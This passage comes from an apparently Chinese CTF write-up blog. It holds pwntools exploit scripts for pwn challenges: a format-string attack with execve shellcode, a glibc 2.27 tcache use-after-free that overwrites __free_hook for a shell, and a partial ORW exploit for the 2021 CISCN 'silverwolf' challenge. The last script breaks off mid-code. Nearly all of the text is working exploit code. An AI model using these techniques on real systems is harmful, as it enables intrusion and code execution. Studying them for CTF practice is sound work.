class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">vuln=<span class="number">0x40127B</span></span><br><span class="line">rl(<span class="string">b&#x27;Welcome this is a gift: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line">pay=<span class="string">b&#x27;%8$100s\x00&#x27;</span>+p64(stack+<span class="number">0x20</span>)*<span class="number">2</span></span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line">rl(<span class="string">b&#x27;input yours password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sl(p64(stack+<span class="number">0x160</span>)+p64(<span class="number">0x4013F1</span>)+p64(stack+<span class="number">0x38</span>)+shell)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="heap">heap</h4><p>2.27的堆题</p><p>add,free,show,edit四个功能，只能申请小堆块，并且序号为0，存在uaf，攻击tcachebin的指针区，之后把指针区free在申请小堆块造成堆块切割，得到libc_base，之后攻击free_hook，getshell</p><p>中间接受heap地址的时候有问题，show出来的是字符串，需要转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from struct import pack</span></span><br><span class="line"><span class="comment">#import ctypes</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#from ae64 import AE64</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i,size</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">data=p.recvline()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">little_endian_bytes = data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为十六进制表示</span></span><br><span class="line">heap_base = <span class="built_in">int</span>(little_endian_bytes.<span class="built_in">hex</span>()[<span class="number">2</span>:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x30</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">7</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">4111520</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">3</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="font-style-color-rgb-34-34-38-2021-ciscn-silverwolf-font"><font style="color:rgb(34, 34, 38);">2021 ciscn silverwolf</font></h3><p>这里奉上2021年国赛题目</p><p>两个题目基本一样，但是国赛题目开了沙盒，要走orw，看别的博客都是把orw分开塞入堆块，走setcontext，我直接走的environ，劫持程序流程，感觉更简单，setcontext那种方法后续有时间在学习</p><p>2.27的堆题</p><p>add,free,show,edit四个功能，只能申请小堆块，并且序号为0，存在uaf，攻击tcachebin的指针区，之后把指针区free在申请小堆块造成堆块切割，得到libc_base，之后攻击stdout_attack，泄露stack地址，劫持edit后的程序流程，构造read，读入orw的链子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28835</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i,size</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x18c0</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x30</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">7</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">4111520</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">rdi = libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line"><span 